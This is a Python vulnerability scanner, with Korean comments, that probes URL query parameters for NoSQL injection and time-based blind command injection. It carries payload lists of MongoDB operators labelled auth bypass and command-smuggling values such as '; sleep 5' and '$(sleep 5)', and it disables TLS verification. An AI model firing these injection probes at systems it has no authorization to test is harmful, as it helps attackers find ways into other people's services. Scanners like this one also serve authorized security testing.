import requests
import time
from rich.console import Console
from concurrent.futures import ThreadPoolExecutor

console = Console()

class BlindScanner:
    def __init__(self, target_urls):
        self.target_urls = target_urls
        self.vulns = []
        self.payloads = {
            "NoSQLi": [
                '{"$gt": ""}',        # Auth Bypass
                '{"$ne": null}',      # Data Leak
                '[$ne]=1'             # Query Parameter style
            ],
            "Blind_CMD": [
                "; sleep 5",
                "| sleep 5",
                "`sleep 5`",
                "$(sleep 5)"
            ]
        }

    def check_nosqli(self, url):
        """NoSQL Injection (MongoDB 등) 탐지"""
        if "?" not in url: return
        base, query = url.split("?", 1)
        params = query.split("&")
        
        for i, p in enumerate(params):
            if "=" not in p: continue
            name, val = p.split("=", 1)
            for payload in self.payloads["NoSQLi"]:
                # 파라미터 오염 방식 (e.g., user[$ne]=1)
                test_param = f"{name}{payload}"
                test_url = f"{base}?{query.replace(p, test_param)}"
                try:
                    res = requests.get(test_url, timeout=5, verify=False)
                    # 응답이 달라지거나 성공 코드가 오면 의심
                    if res.status_code == 200 and len(res.text) > 0:
                        self.vulns.append({"type": "Potential NoSQLi", "url": test_url})
                except: pass

    def check_blind_cmd(self, url):
        """Blind OS Command Injection 탐지 (Time-based)"""
        if "?" not in url: return
        base, query = url.split("?", 1)
        params = query.split("&")

        for i, p in enumerate(params):
            if "=" not in p: continue
            name, val = p.split("=", 1)
            for payload in self.payloads["Blind_CMD"]:
                test_url = f"{base}?{query.replace(p, f'{name}={val}{payload}')}"
                try:
                    start = time.time()
                    requests.get(test_url, timeout=10, verify=False)
                    if time.time() - start >= 4.5:
                        self.vulns.append({"type": "Blind Command Injection", "url": test_url})
                except: pass

    def run(self):
        console.print(f"[bold blue][*][/bold blue] Scanning for Blind NoSQL & Command Injection...")
        with ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(self.check_nosqli, self.target_urls)
            executor.map(self.check_blind_cmd, self.target_urls)
        return self.vulns

def run_blind_scanner(urls):
    scanner = BlindScanner(urls)
    return scanner.run()
